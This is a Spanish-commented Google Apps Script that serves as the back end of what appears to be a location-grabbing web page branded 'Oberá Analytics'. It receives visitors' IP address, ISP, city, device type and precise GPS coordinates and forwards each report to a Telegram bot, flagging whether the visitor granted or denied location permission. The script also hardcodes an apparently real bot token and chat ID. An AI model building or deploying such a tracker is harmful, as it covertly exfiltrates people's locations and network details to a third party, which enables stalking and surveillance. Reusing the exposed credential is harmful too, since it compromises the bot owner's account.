// ============================================
// SCRIPT PARA TELEGRAM BOT
// Envía notificación a tu Telegram cada GPS aceptado
// ============================================

/**
 * CONFIGURACIÓN - EDITA AQUÍ
 */
const TELEGRAM_CONFIG = {
  botToken: '8607851610:AAE1gAl2tHeL6kYN2jxB6QOD87gALi86-S4',
  chatId: '7558822184',
  
  // Configuración opcional
  notificarSinGPS: false, // true = notifica incluso si rechazan
  incluirMapa: true       // true = envía ubicación interactiva
};

/**
 * Función que recibe datos vía POST
 */
function doPost(e) {
  try {
    var data = JSON.parse(e.postData.contents);
    
    // Solo procesar eventos importantes
    if (data.event === 'gps_granted' || data.event === 'gps_granted_retry') {
      enviarNotificacionGPS(data);
      
    } else if (data.event === 'page_load' && TELEGRAM_CONFIG.notificarSinGPS) {
      enviarNotificacionVisita(data);
      
    } else if (data.event === 'gps_denied' && TELEGRAM_CONFIG.notificarSinGPS) {
      enviarNotificacionRechazo(data);
    }
    
    return ContentService.createTextOutput('OK');
    
  } catch (error) {
    Logger.log('Error: ' + error.toString());
    return ContentService.createTextOutput('ERROR: ' + error.toString());
  }
}

/**
 * Enviar notificación cuando se acepta GPS
 */
function enviarNotificacionGPS(data) {
  var lat = data.gpsData?.latitude || 0;
  var lng = data.gpsData?.longitude || 0;
  
  // Datos de red
  var ip = data.networkInfo?.ip || 'N/A';
  var isp = data.networkInfo?.isp || 'N/A';
  var city = data.networkInfo?.city || 'N/A';
  var region = data.networkInfo?.region || 'N/A';
  var country = data.networkInfo?.country || 'N/A';
  var device = data.deviceType || 'N/A';
  
  // Fecha y hora
  var fecha = new Date();
  var fechaStr = fecha.toLocaleDateString('es-AR');
  var horaStr = fecha.toLocaleTimeString('es-AR');
  
  // Link a Google Maps
  var mapUrl = 'https://www.google.com/maps?q=' + lat + ',' + lng;
  
  // Construir mensaje
  var mensaje = 
    '🔴 *Nueva ubicación GPS*\n' +
    '━━━━━━━━━━━━━━━━━━━━\n\n' +
    '📅 *Fecha:* ' + fechaStr + ' - ' + horaStr + '\n\n' +
    '🌐 *INFORMACIÓN DE RED*\n' +
    '━━━━━━━━━━━━━━━━━━━━\n' +
    '🔹 IP: `' + ip + '`\n' +
    '🔹 ISP: ' + isp + '\n' +
    '🔹 Ciudad: ' + city + '\n' +
    '🔹 Región: ' + region + '\n' +
    '🔹 País: ' + country + '\n' +
    '🔹 Dispositivo: ' + device + '\n\n' +
    '✅ *GPS ACEPTADO*\n' +
    '━━━━━━━━━━━━━━━━━━━━\n' +
    '📍 Lat: `' + lat + '`\n' +
    '📍 Lng: `' + lng + '`\n' +
    '📏 Precisión: ' + (data.gpsData?.accuracy || 'N/A') + ' metros\n\n' +
    '🗺️ [Ver en Google Maps](' + mapUrl + ')';
  
  // Enviar mensaje
  enviarMensajeTelegram(mensaje);
  
  // Si está configurado, enviar ubicación interactiva
  if (TELEGRAM_CONFIG.incluirMapa) {
    enviarUbicacionTelegram(lat, lng);
  }
}

/**
 * Enviar notificación de visita (sin GPS)
 */
function enviarNotificacionVisita(data) {
  var fecha = new Date().toLocaleString('es-AR');
  
  var mensaje = 
    '🌐 *Nueva visita*\n' +
    '━━━━━━━━━━━━━━━━━━━━\n\n' +
    '📅 ' + fecha + '\n' +
    '🔹 IP: `' + (data.networkInfo?.ip || 'N/A') + '`\n' +
    '🔹 ISP: ' + (data.networkInfo?.isp || 'N/A') + '\n' +
    '🔹 Ciudad: ' + (data.networkInfo?.city || 'N/A') + '\n' +
    '🔹 Dispositivo: ' + (data.deviceType || 'N/A') + '\n\n' +
    '⏳ Esperando permiso GPS...';
  
  enviarMensajeTelegram(mensaje);
}

/**
 * Enviar notificación de rechazo GPS
 */
function enviarNotificacionRechazo(data) {
  var fecha = new Date().toLocaleString('es-AR');
  
  var mensaje = 
    '❌ *GPS Rechazado*\n' +
    '━━━━━━━━━━━━━━━━━━━━\n\n' +
    '📅 ' + fecha + '\n' +
    '🔹 IP: `' + (data.networkInfo?.ip || 'N/A') + '`\n' +
    '🔹 Ciudad: ' + (data.networkInfo?.city || 'N/A') + '\n\n' +
    '⚠️ Usuario denegó el permiso';
  
  enviarMensajeTelegram(mensaje);
}

/**
 * Enviar mensaje de texto a Telegram
 */
function enviarMensajeTelegram(texto) {
  var url = 'https://api.telegram.org/bot' + TELEGRAM_CONFIG.botToken + '/sendMessage';
  
  var payload = {
    chat_id: TELEGRAM_CONFIG.chatId,
    text: texto,
    parse_mode: 'Markdown',
    disable_web_page_preview: false
  };
  
  var options = {
    method: 'post',
    contentType: 'application/json',
    payload: JSON.stringify(payload),
    muteHttpExceptions: true
  };
  
  try {
    var response = UrlFetchApp.fetch(url, options);
    Logger.log('Mensaje enviado a Telegram');
  } catch (error) {
    Logger.log('Error enviando a Telegram: ' + error.toString());
  }
}

/**
 * Enviar ubicación interactiva a Telegram
 */
function enviarUbicacionTelegram(lat, lng) {
  var url = 'https://api.telegram.org/bot' + TELEGRAM_CONFIG.botToken + '/sendLocation';
  
  var payload = {
    chat_id: TELEGRAM_CONFIG.chatId,
    latitude: lat,
    longitude: lng
  };
  
  var options = {
    method: 'post',
    contentType: 'application/json',
    payload: JSON.stringify(payload),
    muteHttpExceptions: true
  };
  
  try {
    UrlFetchApp.fetch(url, options);
    Logger.log('Ubicación enviada a Telegram');
  } catch (error) {
    Logger.log('Error enviando ubicación: ' + error.toString());
  }
}

/**
 * Función de prueba
 */
function testTelegram() {
  var mensajePrueba = 
    '✅ *Test Oberá Analytics*\n\n' +
    'Si recibes este mensaje, el bot está configurado correctamente.\n\n' +
    '🚀 Listo para recibir notificaciones';
  
  enviarMensajeTelegram(mensajePrueba);
  Logger.log('Mensaje de prueba enviado');
}
